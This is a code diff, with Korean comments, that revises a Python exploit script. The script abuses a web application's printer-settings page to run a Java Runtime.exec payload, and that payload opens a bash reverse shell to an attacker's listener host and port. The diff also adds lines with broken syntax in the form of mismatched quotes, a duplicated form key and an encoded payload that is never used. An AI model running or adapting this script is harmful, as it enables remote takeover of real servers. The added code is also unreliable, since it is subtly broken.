@@ -3,6 +3,7 @@ import argparse
 import requests
 import subprocess
 import urllib.parse
+import time
 
 def get_session_id(base_url):
     s = requests.Session()
@@ -41,14 +42,21 @@ def set_setting(base_url, session, setting, enabled):
         'sp': 'S1',
         'Form1': '$TextField$0,$Submit,$Submit$0',
         '$TextField$0': enabled,
+        '$TextField$0': enabled,
         '$Submit': 'Update'
     }
     r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
 
 def execute_reverse_shell(base_url, session, lhost, lport):
-    print(f'[*] Prepparing to execute reverse shell to {lhost}:{lport}')
-    reverse_shell_payload = f"bash -c 'sh -i>& /dev/tcp/{lhost}/{lport} 0>&1'"
-    payload = f"java.lang.Runtime.getRuntime().exec('{reverse_shell_payload}');"
+    print(f'[*] Preparing to execute reverse shell to {lhost}:{lport}')
+
+    # 더 명시적인 bash 리버스 쉘 페이로드 및 인코딩 처리
+    reverse_shell_payload = f"bash -c $'bash -i >& /dev/tcp/{lhost}/{lport} <&1'"
+    encoded_payload = urllib.parse.quote(reverse_shell_payload)
+
+    # Java exec() 호출 시 페이로드 전달 방식 수정
+    payload = f"java.lang.Runtime.getRuntime().exec(new String[]{{\"/bin/bash\", \"-c\", \"{reverse_shell_payload}\"}});"
+
     headers = {'Origin': f'{base_url}'}
     data = {
         'service': 'page/PrinterList'
@@ -79,9 +87,11 @@ def execute_reverse_shell(base_url, session, lhost, lport):
     }
     r = session.post(f'{base_url}/app', data=data, headers=headers, verify=False)
     if r.status_code == 200 and 'Saved successfully' in r.text:
-        print(f'[+] Reverse shell initiated. Check your listener at {lhost}:{lport}')
+        print(f'[+] Reverse shell command injected. Please check your listener at {lhost}:{lport} in a few seconds.')
+        print(f'[+] Payload: {payload}")
     else:
         print('[-] Might not have a printer configured. Exploit manually by adding one.')
+        print(f'[-] Failed Payload: {payload}")
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser()
